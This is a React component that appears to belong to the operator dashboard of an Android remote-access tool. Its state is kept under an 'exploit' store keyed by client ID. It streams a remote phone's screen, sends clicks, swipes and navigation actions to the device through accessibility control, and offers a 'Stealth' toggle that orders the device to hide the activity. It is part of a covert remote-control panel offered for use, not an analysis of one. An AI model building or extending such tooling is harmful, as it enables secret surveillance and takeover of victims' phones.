
import { useEffect, useRef, useState } from 'react'
import { Button } from '@/components/ui/button'
import {
  MonitorPlay,
  Square,
  Play,
  Moon,
  ArrowLeft,
  Home,
  LayoutGrid,
} from 'lucide-react'
import { emitOrder } from '@/lib/socket'
import { useAppSelector } from '@/store/hooks'

export function ScreenShareTab({ clientId }: { clientId: string }) {
  const img = useAppSelector((s) => s.exploit.byClient[clientId]?.screenImage)
  const w = useAppSelector((s) => s.exploit.byClient[clientId]?.screenW) ?? 1080
  const h = useAppSelector((s) => s.exploit.byClient[clientId]?.screenH) ?? 1920
  const accEnabled = useAppSelector(
    (s) => s.exploit.byClient[clientId]?.accessibilityEnabled,
  )
  const [streaming, setStreaming] = useState(false)
  const [stealth, setStealth] = useState(false)
  const imgRef = useRef<HTMLImageElement>(null)
  const downRef = useRef<{ x: number; y: number; time: number } | null>(null)

  useEffect(() => {
    return () => {
      if (streaming) emitOrder(clientId, 'screen_share', { action: 'stop' })
    }
  }, [])

  const start = () => {
    setStreaming(true)
    emitOrder(clientId, 'screen_share', { action: 'start' })
  }
  const stop = () => {
    setStreaming(false)
    emitOrder(clientId, 'screen_share', { action: 'stop' })
  }

  const onDown = (e: React.MouseEvent) => {
    e.preventDefault()
    const rect = imgRef.current?.getBoundingClientRect()
    if (!rect) return
    downRef.current = {
      x: (e.clientX - rect.left) / rect.width,
      y: (e.clientY - rect.top) / rect.height,
      time: Date.now(),
    }
  }
  const onUp = (e: React.MouseEvent) => {
    e.preventDefault()
    if (!downRef.current) return
    const rect = imgRef.current?.getBoundingClientRect()
    if (!rect) return
    const up = {
      x: (e.clientX - rect.left) / rect.width,
      y: (e.clientY - rect.top) / rect.height,
      time: Date.now(),
    }
    const dx = up.x - downRef.current.x
    const dy = up.y - downRef.current.y
    const dist = Math.sqrt(dx * dx + dy * dy)
    const duration = up.time - downRef.current.time
    if (dist < 0.02) {
      emitOrder(clientId, 'gesture', {
        type: 'click',
        x: Math.round(up.x * w),
        y: Math.round(up.y * h),
      })
    } else {
      emitOrder(clientId, 'gesture', {
        type: 'swipe',
        x1: Math.round(downRef.current.x * w),
        y1: Math.round(downRef.current.y * h),
        x2: Math.round(up.x * w),
        y2: Math.round(up.y * h),
        duration: Math.max(duration, 200),
      })
    }
    downRef.current = null
  }

  const nav = (actionId: number) =>
    emitOrder(clientId, 'gesture', { type: 'action', actionId })

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          <MonitorPlay className="h-4 w-4 text-emerald-400" />
          <h3 className="text-sm font-semibold text-zinc-100">Screen Share</h3>
        </div>
        <div className="flex items-center gap-3 text-[11px]">
          <span
            className={
              streaming ? 'text-emerald-400' : 'text-zinc-500'
            }
          >
            {streaming ? 'Live' : 'Offline'} · {w}×{h}
          </span>
          <span
            className={
              accEnabled === false
                ? 'text-rose-400'
                : accEnabled
                  ? 'text-emerald-400'
                  : 'text-zinc-500'
            }
          >
            A11y:{' '}
            {accEnabled === false
              ? 'Off'
              : accEnabled
                ? 'On'
                : '?'}
          </span>
        </div>
      </div>

      <div className="relative aspect-[9/16] max-h-[60vh] mx-auto w-fit overflow-hidden rounded-xl border border-white/10 bg-black/60">
        <img
          ref={imgRef}
          src={img ? `data:image/jpeg;base64,${img}` : undefined}
          alt="screen"
          draggable={false}
          onMouseDown={onDown}
          onMouseUp={onUp}
          className="max-h-[60vh] w-auto select-none"
          style={{
            display: img ? 'block' : 'none',
            cursor: 'crosshair',
          }}
        />
        {!img && (
          <div className="absolute inset-0 grid place-items-center text-zinc-600 text-xs">
            Screen offline
          </div>
        )}
      </div>

      <div className="flex flex-wrap items-center gap-2">
        {!streaming ? (
          <Button
            onClick={start}
            className="bg-emerald-500 hover:bg-emerald-400 text-zinc-950 font-semibold"
          >
            <Play className="h-4 w-4" /> Start Share
          </Button>
        ) : (
          <Button
            onClick={stop}
            className="bg-rose-500/90 hover:bg-rose-500 text-white font-semibold"
          >
            <Square className="h-4 w-4" /> Stop
          </Button>
        )}
        <Button
          variant="outline"
          onClick={() => {
            const next = !stealth
            setStealth(next)
            emitOrder(clientId, 'stealth', { enable: next })
          }}
          className={`border-white/15 ${
            stealth
              ? 'bg-rose-500/15 text-rose-300 ring-1 ring-rose-500/30'
              : 'text-zinc-300 hover:bg-white/5'
          }`}
        >
          <Moon className="h-4 w-4" />
          {stealth ? 'Stealth On' : 'Stealth Off'}
        </Button>
        <div className="ml-auto flex gap-1">
          <Button
            variant="outline"
            size="icon"
            onClick={() => nav(1)}
            title="Back"
            className="bg-transparent border-white/15 text-zinc-300 hover:bg-white/5"
          >
            <ArrowLeft className="h-4 w-4" />
          </Button>
          <Button
            variant="outline"
            size="icon"
            onClick={() => nav(2)}
            title="Home"
            className="bg-transparent border-white/15 text-zinc-300 hover:bg-white/5"
          >
            <Home className="h-4 w-4" />
          </Button>
          <Button
            variant="outline"
            size="icon"
            onClick={() => nav(3)}
            title="Recents"
            className="bg-transparent border-white/15 text-zinc-300 hover:bg-white/5"
          >
            <LayoutGrid className="h-4 w-4" />
          </Button>
        </div>
      </div>
    </div>
  )
}
